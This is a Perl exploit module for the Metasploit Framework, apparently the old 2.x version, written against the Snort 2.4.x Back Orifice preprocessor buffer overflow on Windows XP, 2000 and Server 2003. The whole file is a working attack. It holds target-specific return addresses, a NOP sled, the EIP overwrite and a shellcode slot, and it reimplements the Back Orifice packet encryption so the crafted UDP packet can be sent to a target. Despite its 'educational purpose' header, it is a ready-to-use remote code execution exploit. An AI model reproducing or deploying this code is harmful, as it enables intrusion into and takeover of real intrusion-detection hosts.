###############################################################
# for educational purpose only
# by Kira < trir00t [at] gmail.com >
###############################################################
package Msf::Exploit::snort_bo_overflow_win32;
use base 'Msf::Exploit';
use strict;
use Pex::Text;

my $holdrand;
my $advanced = {};

my $info = 
{
	'Name' => 'Snort Back Orifice Preprocessor Overflow',
	'Version' => '$Revision: 1.0 $',
	'Authors' => [ 'Trirat Puttaraksa (Kira) <trir00t [at] gmail.com>', ],
	'Arch' => ['x86'],
	'OS' => ['win32', 'win2000', 'winxp', 'win2003'],
	'Priv' => 1,
	'UserOpts' => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 53],
	},

	'Payload' => {
		'Space' => 1024, # you can use more spaces
		'BadChars' => "\x00",
	},

	'Description' => Pex::Text::Freeform(qq{
		This exploits the buffer overflow in Snort version 
		2.4.0 to 2.4.2. This particular module is capable of
		exploiting the bug on x86 Win32, Win2000, WinXP and Win2003. 
		Exploitation in this vulnerability is depend on many factors. 
		Difference in GCC version, compiled option and 
		operating system made diffent technique in exploitation.
	}),

	'Refs' => [
		['URL ', "http://www.securityfocus.com/bid/15131"],
	],	
	
	'Targets' => [

	["Snort 2.4.2 Binary on Windows XP Professional SP1", 0x77da54d4,
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows XP Professional SP2", 0x77daacdb, 
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows Server 2003 SP1", 0x7d065177, 
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows Server 2000 SP0", 0x77e33f69,
		(18+1024+1028+1024)],
	["Snort 2.4.2 Binary on Windows 2000 Professional SP0", 0x7850cdef,
		(18+1024+1028+1024)],
	],

	'Keys' => ['Snort'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return ($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx = $self->GetVar('TARGET');
	my $shellcode = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if(! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $socket = Msf::Socket::Udp->new
		(
			'PeerAddr' => $target_host,
			'PeerPort' => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
		);

	if($self->IsError) {
		$self->PrintLine("[*] Error creating socket: " . 
						$socket->GetError);
	}

	$self->PrintLine(sprintf("[*] Trying " . $target->[0] . " using return address 0x%.8x....", $target->[1]));

	my $payload = "*!*QWTY?";		# Magic string: 8 bytes
	$payload .= pack('V', $target->[2]);	# Len: 4 bytes
	$payload .= "\xed\xac\xef\x0d";		# UDP packet id
	$payload .= "\x01";			# BO type (PING)
	$payload .= "\x90" x 1024;		# Data
	$payload .= "\x90" x 1024;		# offset to EIP
	$payload .= pack('V', $target->[1]);	# return address
	$payload .= $shellcode;			# our shellcode

	$payload = bocrypt($payload);		# encrypted payload

	$self->PrintLine("[*] Sending Exploit....");
	$socket->Send($payload);
}

sub bocrypt {
	my $tmppayload = shift;
	my @arrpayload = split(//, $tmppayload);
	my $retpayload;
	my $c;
	
	msrand(31337);

	foreach $c (@arrpayload) {
		$retpayload .= chr((ord($c) ^ (mrand()%256)));
	}
	return ($retpayload);
}

sub msrand {
	$holdrand = shift;
}

sub mrand {
	return ((($holdrand = ($holdrand * 214013 + 2531011 & 0xffffffff)) >> 16) & 0x7fff);
}
